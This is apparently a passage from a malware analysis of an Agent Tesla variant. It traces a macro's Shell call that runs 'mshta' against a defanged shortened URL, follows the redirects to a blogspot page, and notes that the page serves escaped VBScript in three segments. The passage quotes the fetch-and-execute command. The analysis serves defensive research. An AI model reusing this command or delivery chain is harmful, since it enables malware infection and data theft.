
As you can see in Figure 2.3, it is about to execute “Shell# UserForm2.OptionButton1.Tag” (where the last \"_\" in Figure 2.3 is a kind of line-continuation character) to run the command-line command \"mshta hxxp://www[.]j[.]mp/ais1kdoaksodjasod14\", which was loaded from the property “UserForm2.OptionButton1.Tag”.
“mshta.exe” file is a software component of the Microsoft HTML Application Host, a utility responsible for executing HTA (HTML Application) files in Windows OS.
An HTA file is a Microsoft Windows program whose source code consists of HTML, Dynamic HTML, and scripting, such as VBScript or JScript.
The URL “hxxp://www[.]j[.]mp/ais1kdoaksodjasod14” is redirected to “hxxp://bit[.]ly/ais1kdoaksodjasod14” and finally, is redirected to “hxxps://p8hj[.]blogspot[.]com/p/27.html” (“27.html”).
As you may have guessed, the response from “27.html” contains malicious code, VBScript code for this case, which is encoded by the escape() function.
There are three segments of VBScript code in the response from “27.html”.
Figure 2.4 highlights the three segments of VBScript code that will be decoded and executed within the process “mshta.exe”.
In the next section, I will demonstrate what the three segments of VBScript code do.
Three Segments of VBScript Code 1.
Overview of the new Agent Tesla variant, the Auto-Run Group, and Task Scheduler After calling unescape() twice to the first segment of VBScript code, we finally obtain HTML content, as shown in figure 3.1.